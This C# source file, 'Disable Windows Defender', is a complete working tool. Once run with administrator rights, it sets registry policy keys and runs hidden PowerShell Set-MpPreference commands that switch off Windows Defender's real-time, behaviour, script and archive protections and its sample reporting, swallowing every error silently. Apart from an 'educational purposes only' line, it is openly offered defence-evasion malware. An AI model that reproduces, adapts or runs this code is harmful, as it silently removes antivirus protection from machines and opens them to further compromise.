using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Security.Principal;
using System.Threading;

//       │ Author     : NYAN CAT
//       │ Name       : Disable Windows Defender v0.3.5
//       │ Contact    : https://github.com/NYAN-x-CAT

//       This program is distributed for educational purposes only. 

namespace Disable_Windows_Defender
{
    class Program
    {
        static void Main()
        {

            if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator)) return;

            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", "1");
            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableBehaviorMonitoring","1");
            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableOnAccessProtection", "1");
            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableScanOnRealtimeEnable", "1");

            Thread.Sleep(100);

            RunPS("Set-MpPreference -DisableRealtimeMonitoring $true");
            RunPS("Set-MpPreference -DisableBehaviorMonitoring $true");
            RunPS("Set-MpPreference -DisableBlockAtFirstSeen $true");
            RunPS("Set-MpPreference -DisableIOAVProtection $true");
            RunPS("Set-MpPreference -DisablePrivacyMode $true");
            RunPS("Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true");
            RunPS("Set-MpPreference -DisableArchiveScanning $true");
            RunPS("Set-MpPreference -DisableScriptScanning $true");
            RunPS("Set-MpPreference -SubmitSamplesConsent 0");
            RunPS("Set-MpPreference -MAPSReporting 0");
        }

        private static void RegistryEdit(string regPath, string name, string value)
        {
            try
            {
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(regPath,RegistryKeyPermissionCheck.ReadWriteSubTree))
                {
                    if (key == null)
                    {
                        Registry.LocalMachine.CreateSubKey(regPath).SetValue(name, value, RegistryValueKind.DWord);
                        return;
                    }
                    if (key.GetValue(name) != (object)value)
                        key.SetValue(name, value, RegistryValueKind.DWord);
                }
            }
            catch { }
        }

        private static void RunPS(string args)
        {
            try
            {
                ProcessStartInfo ps = new ProcessStartInfo();
                ps.FileName = "powershell.exe";
                ps.Arguments = args;
                ps.WindowStyle = ProcessWindowStyle.Hidden;
                Process process = new Process();
                process.StartInfo = ps;
                process.Start();
            }
            catch { }
        }
    }
}
